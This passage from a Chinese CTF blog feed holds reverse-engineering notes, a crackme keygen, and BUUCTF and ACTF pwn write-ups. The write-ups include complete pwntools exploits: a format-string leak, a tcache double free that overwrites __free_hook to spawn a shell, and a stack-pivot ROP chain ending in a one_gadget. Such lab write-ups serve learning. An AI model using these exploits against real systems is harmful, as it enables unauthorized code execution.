&#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>大师傅的wp，详细解释了这个程序中反调试的部分，值得阅读:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.ax函数</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>c语言到汇编指令这篇博文中，我一开始通过gcc编译源文件，没有关闭地址随机化这个选项，在编译出的程序的反汇编中，发现了很奇怪的call指令<br>源程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">│   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">│   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">│   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">│   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">│   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">│   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">│   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">│   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">│   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">│   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">│   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>在main+10的位置处调用了一个__x86.get_pc_thunk.ax，很好奇这个是什么东西，gdb动态调试跟进去看看</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>发现了只有两条汇编指令</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>esp存的就是main函数的地址（因为在main函数中call了当前这个函数）</p><p>简单说这个指令就相当于<code>mov eax,eip</code></p><p>这个函数的作用就是get到main函数的地址</p><p>很好奇，为什么要获得main函数的地址呢？</p><p>我们继续往下走</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>发现eax这里通过add一个数字后变成了GOT表的地址，这样就不难理解了（关于什么是GOT表和PLT表，我会后面再展开文章进行学习记录），这个函数在x86上的PIC（position independent code）中使用，用来实现对模块的内部数据进行访问，比如全局变量。我们在main函数中访问一下全局变量x，用gdb查看汇编代码，果然可以看到程序访问x是通过GOT进行的。</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>事实上类似的函数还有：<code>__x86.get_pc_thunk.bx</code>，<code>__x86.get_pc_thunk.cx</code>， <code>__x86.get_pc_thunk.dx</code>。功能是类似的，只不过传入的寄存器分别为<code>%ebx</code>， <code>%ecx</code>， <code>%edx</code>。早期版本的编译器中，这个函数叫<code>__i686.get_pc_thunk.ax</code>。</p></blockquote><h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><p>使用gcc编译命令</p><p><code>gcc -fno-pie</code></p><p>关闭pie，调试程序发现已经不需要再通过该函数进行寻址了</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.ax函数</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言到汇编指令1</title>
      <link href="2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/"/>
      <url>2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/</url>
      
        <content type="html"><![CDATA[<p>(未完工)</p><p>近期发现pwn知识在比赛中越来越注重逆向的技能，我这才深刻认识到二进制安全是不分家的，遂开发一下逆向的技能，多注重一下基本功的技能。</p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>常用的调用约定有__cdecl(c规范),pascal,stdcall,Fastcall<br>gcc编译器默认采用__cdecl调用约定<br>在上述调用约定中，只有__cdecl平衡栈的角色是调用者，其余都是子程序</p><h2 id="c语言翻译为汇编"><a href="#c语言翻译为汇编" class="headerlink" title="c语言翻译为汇编"></a>c语言翻译为汇编</h2><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peach’s-Crackme"><a href="#Peach’s-Crackme" class="headerlink" title="Peach’s Crackme"></a>Peach’s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>程序简介，一个简单的注册功能<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>首先x64dbg分析一下，根据程序功能找找字符串啥的<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDA静态分析，来定位一下地址啥的，然后f5大法直接读伪代码<br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最终定位到这个地方<br>主要分析一下v5和v7都是啥，通过ida的万能x引用大法，追踪到一个win32函数，查手册把功能和参数给搞清楚就ok了<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>最终发现v5是注册时的名字，v7是我们输入的序列号，二者之间通过一个函数来处理，本地运行一下函数就行了，直接出序列号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>太简单了，把他的算法跑一遍就把结果出来了</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>记录下buuctf pwn的write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑就是之前把flag文件读入内存，然后输入字符串和flag字符串进行对比<br>主函数存在格式化字符串漏洞，我们直接在栈上找到格式化字符串参数的位置，然后直接读出来即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>考点<ol><li>程序调试，栈溢出泄漏地址</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>程序先给了一个输入name和id的东西，发现了格式化字符串但是由于是__printf_chk，所以没找到好的利用点<br>然后下面是输入id，还有个puts，调试发现id后面是有libc函数setbuffer的，又因为是puts函数直接来给他泄漏出来<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>add功能只允许申请0-0x50大小的chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>delete功能存在UAF<br>在老版的libc-2.27下是允许double free存在的<br>然后直接改__free_hook为system一把梭就行了<br>新版的打完今天的VN再试一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actf栈迁移</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="分析回顾栈迁移"><a href="#分析回顾栈迁移" class="headerlink" title="分析回顾栈迁移"></a>分析回顾栈迁移</h2><p>没有开PIE保护和Canary</p><ul><li>IDA分析结果如下<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>题目给出栈地址，我们可以将栈迁移到栈上，布置gadget泄漏libc地址然后one_gadget一把梭</p><ul><li>栈帧结构如下<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制程序从源文件到可执行程序的过程</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>在c语言中，我们都知道一个源程序从源码到可执行文件都要经历预处理，编译，汇编和链接的过程，最终形成可执行文件，然后才被操作系统装载进内存运行。</p><p>为了复习pwn知识，写个文章来探究一下经常被我忽略的关于程序的中间过程。</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>该过程主要处理源代码中以’#’开始的预编译指令<br>具体处理规则如下：</p><ul><li>删除#define并展开所有的宏定义</li><li>处理所有条件预编译指令：如 “#if”等</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置</li><li>删除注释，添加行号和文件名标识</li></ul><p>预编译的过程可用如下指令来执行 </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>源代码如下：<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>经过预编译后：<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程经过一系列词法分析等步骤生成汇编代码文件，是程序构建的核心部分<br>不同的操作系统有不同的编译器，比如Linux下的gcc，g++，Windows下的MSVCCL等（后文都以Linux平台下来探究）<br>我们可以使用<code>gcc -S BinaryName.i -o BinaryName.s</code>或者<code>gcc -S BinaryName -o BinaryName.s</code>来查看经过编译后的文件</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编过程可以将汇编代码转变为机器可以执行的指令<br><code>gcc -c BinaryName.s -o BinaryName.o</code>或<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>我们先看下c语言源代码中的变量和函数</p><h3 id="c语言源代码中的变量和函数"><a 